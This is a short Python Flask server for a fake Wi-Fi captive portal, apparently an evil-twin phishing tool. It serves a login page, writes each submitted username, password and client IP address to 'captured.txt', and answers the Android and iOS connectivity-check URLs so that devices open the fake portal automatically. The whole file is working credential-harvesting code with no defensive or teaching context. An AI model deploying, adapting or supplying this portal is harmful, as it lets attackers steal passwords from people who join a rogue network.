import os
from flask import Flask, request, redirect, send_file
app = Flask(__name__)

@app.route('/')
def index():
    path = os.path.join(os.path.dirname(__file__), "index.html")
    return send_file(path)

@app.route('/log', methods=['POST'])
def log():
    user = request.form['user']
    password = request.form['pass']
    ip = request.remote_addr
    with open("captured.txt", "a") as f:
        f.write(f"IP: {ip}, Username: {user}, Password: {password}\n")
    return redirect('/')


# Captive portal detection endpoints
@app.route("/generate_204")
def android_check():
    return redirect('/')

@app.route("/hotspot-detect.html")
def ios_check():
    return redirect('/')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)